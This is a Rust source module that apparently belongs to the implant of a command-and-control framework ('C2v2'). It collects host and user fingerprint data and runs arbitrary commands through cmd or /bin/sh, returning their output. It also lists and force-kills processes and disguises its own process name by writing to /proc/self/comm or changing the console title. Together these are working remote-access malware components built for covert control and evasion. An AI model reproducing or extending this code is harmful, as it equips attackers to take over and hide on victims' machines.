use serde_json::{json, Value};
use std::net::UdpSocket;
use std::process::{Command, Stdio};
use std::sync::mpsc;
use std::time::{Duration, Instant};

pub fn os_name() -> &'static str {
    if cfg!(target_os = "windows") {
        "windows"
    } else if cfg!(target_os = "macos") {
        "darwin"
    } else if cfg!(target_os = "android") {
        "android"
    } else {
        "linux"
    }
}

pub fn arch() -> &'static str {
    match std::env::consts::ARCH {
        "x86_64" => "amd64",
        "aarch64" => "arm64",
        "x86" => "386",
        other => other,
    }
}

pub fn hostname() -> String {
    for k in ["COMPUTERNAME", "HOSTNAME"] {
        if let Ok(v) = std::env::var(k) {
            if !v.is_empty() {
                return v;
            }
        }
    }
    if let Ok(s) = std::fs::read_to_string("/proc/sys/kernel/hostname") {
        let t = s.trim();
        if !t.is_empty() {
            return t.to_string();
        }
    }
    "unknown-host".to_string()
}

pub fn username() -> String {
    for k in ["USERNAME", "USER", "LOGNAME"] {
        if let Ok(v) = std::env::var(k) {
            if !v.is_empty() {
                return v;
            }
        }
    }
    "unknown-user".to_string()
}

pub fn local_addrs() -> Vec<String> {
    let mut out = Vec::new();
    if let Ok(s) = UdpSocket::bind("0.0.0.0:0") {
        if s.connect("1.1.1.1:80").is_ok() {
            if let Ok(a) = s.local_addr() {
                out.push(a.ip().to_string());
            }
        }
    }
    out.sort();
    out.dedup();
    out
}

pub fn machine() -> Value {
    json!({
        "host": hostname(),
        "os": os_name(),
        "arch": arch(),
        "user": username(),
        "pid": std::process::id(),
        "version": crate::VERSION,
        "addrs": local_addrs(),
    })
}

pub fn sysinfo() -> Value {
    let mut m = machine();
    let cwd = std::env::current_dir()
        .map(|p| p.to_string_lossy().to_string())
        .unwrap_or_default();
    let uptime = read_uptime();
    if let Some(obj) = m.as_object_mut() {
        obj.insert("cwd".into(), json!(cwd));
        obj.insert("exe".into(), json!(std::env::current_exe().map(|p| p.to_string_lossy().to_string()).unwrap_or_default()));
        obj.insert("ppid".into(), json!(std::process::id()));
        obj.insert("uptime_secs".into(), json!(uptime));
        obj.insert("ts".into(), json!(crate::wire::now()));
        obj.insert("masquerade".into(), json!(std::env::var("C2V2_MASQ").unwrap_or_default()));
    }
    m
}

fn read_uptime() -> u64 {
    if cfg!(windows) {
        return 0;
    }
    std::fs::read_to_string("/proc/uptime")
        .ok()
        .and_then(|s| s.split_whitespace().next().and_then(|x| x.parse::<f64>().ok()))
        .map(|f| f as u64)
        .unwrap_or(0)
}

/// Best-effort process name / console title change (no rootkit claims).
pub fn apply_masquerade(name: &str) {
    if name.is_empty() {
        return;
    }
    if cfg!(windows) {
        let _ = Command::new("cmd")
            .args(["/C", "title", name])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status();
    } else if cfg!(target_os = "linux") {
        // prctl(PR_SET_NAME) via libc is avoided to keep the crate dependency-free;
        // use the standard "exec -a" trick only when launched through a wrapper.
        let _ = std::fs::write("/proc/self/comm", name.as_bytes());
    }
}

pub fn run_shell(cmd: &str, timeout: Duration) -> Result<Value, String> {
    let (mut child, out_rx, err_rx) = if cfg!(windows) {
        let mut c = Command::new("cmd")
            .args(["/C", cmd])
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .map_err(|e| format!("spawn cmd: {}", e))?;
        let out = c.stdout.take();
        let err = c.stderr.take();
        (c, spawn_reader(out), spawn_reader(err))
    } else {
        let mut c = Command::new("/bin/sh")
            .args(["-c", cmd])
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .map_err(|e| format!("spawn sh: {}", e))?;
        let out = c.stdout.take();
        let err = c.stderr.take();
        (c, spawn_reader(out), spawn_reader(err))
    };
    let start = Instant::now();
    let status = loop {
        match child.try_wait() {
            Ok(Some(st)) => break st,
            Ok(None) => {
                if start.elapsed() > timeout {
                    let _ = child.kill();
                    break child.wait().map_err(|e| e.to_string())?;
                }
                std::thread::sleep(Duration::from_millis(25));
            }
            Err(e) => return Err(format!("wait: {}", e)),
        }
    };
    // Give readers a moment to drain pipes.
    let stdout = recv_all(&out_rx, Duration::from_millis(500));
    let stderr = recv_all(&err_rx, Duration::from_millis(200));
    Ok(json!({
        "exit_code": status.code().unwrap_or(-1),
        "stdout": stdout,
        "stderr": stderr,
        "elapsed_ms": start.elapsed().as_millis() as u64,
        "timed_out": start.elapsed() > timeout,
    }))
}

fn spawn_reader<R: std::io::Read + Send + 'static>(r: Option<R>) -> mpsc::Receiver<Vec<u8>> {
    let (tx, rx) = mpsc::channel();
    if let Some(mut r) = r {
        std::thread::spawn(move || {
            let mut buf = Vec::new();
            let mut chunk = [0u8; 8192];
            loop {
                match r.read(&mut chunk) {
                    Ok(0) => break,
                    Ok(n) => {
                        buf.extend_from_slice(&chunk[..n]);
                        if buf.len() > 4 << 20 {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
            let _ = tx.send(buf);
        });
    } else {
        let _ = tx.send(Vec::new());
    }
    rx
}

fn recv_all(rx: &mpsc::Receiver<Vec<u8>>, wait: Duration) -> String {
    let data = rx.recv_timeout(wait).unwrap_or_default();
    match String::from_utf8(data.clone()) {
        Ok(s) => s,
        Err(_) => crate::wire::b64(&data),
    }
}

pub fn process_list() -> Result<Vec<Value>, String> {
    let mut out = Vec::new();
    if cfg!(windows) {
        let o = Command::new("tasklist")
            .args(["/FO", "CSV", "/NH"])
            .output()
            .map_err(|e| e.to_string())?;
        let text = String::from_utf8_lossy(&o.stdout);
        for line in text.lines().take(2000) {
            let cols: Vec<String> = line
                .split("\",\"")
                .map(|s| s.trim_matches('"').to_string())
                .collect();
            if cols.len() >= 2 {
                out.push(json!({
                    "name": cols[0],
                    "pid": cols[1].parse::<u32>().unwrap_or(0),
                    "mem": cols.get(4).cloned().unwrap_or_default(),
                }));
            }
        }
        return Ok(out);
    }
    if cfg!(target_os = "linux") || cfg!(target_os = "android") {
        let dir = std::fs::read_dir("/proc").map_err(|e| e.to_string())?;
        for e in dir.flatten() {
            let name = e.file_name().to_string_lossy().to_string();
            if let Ok(pid) = name.parse::<u32>() {
                let cmdline = std::fs::read(format!("/proc/{}/cmdline", pid))
                    .map(|b| String::from_utf8_lossy(&b).replace('\0', " ").trim().to_string())
                    .unwrap_or_default();
                if cmdline.is_empty() {
                    continue;
                }
                out.push(json!({ "pid": pid, "cmd": cmdline }));
                if out.len() >= 500 {
                    break;
                }
            }
        }
        return Ok(out);
    }
    let o = Command::new("ps")
        .args(["-axo", "pid=,user=,comm="])
        .output()
        .map_err(|e| e.to_string())?;
    for line in String::from_utf8_lossy(&o.stdout).lines().take(500) {
        let mut it = line.split_whitespace();
        let pid = it.next().and_then(|s| s.parse::<u32>().ok()).unwrap_or(0);
        let user = it.next().unwrap_or("");
        let cmd: Vec<&str> = it.collect();
        out.push(json!({"pid": pid, "user": user, "cmd": cmd.join(" ")}));
    }
    Ok(out)
}

pub fn kill_process(pid: u32) -> Result<(), String> {
    if pid == 0 {
        return Err("invalid pid".into());
    }
    let st = if cfg!(windows) {
        Command::new("taskkill")
            .args(["/F", "/PID", &pid.to_string()])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
    } else {
        Command::new("kill")
            .args(["-9", &pid.to_string()])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
    }
    .map_err(|e| e.to_string())?;
    if st.success() {
        Ok(())
    } else {
        Err(format!("kill exit {:?}", st.code()))
    }
}
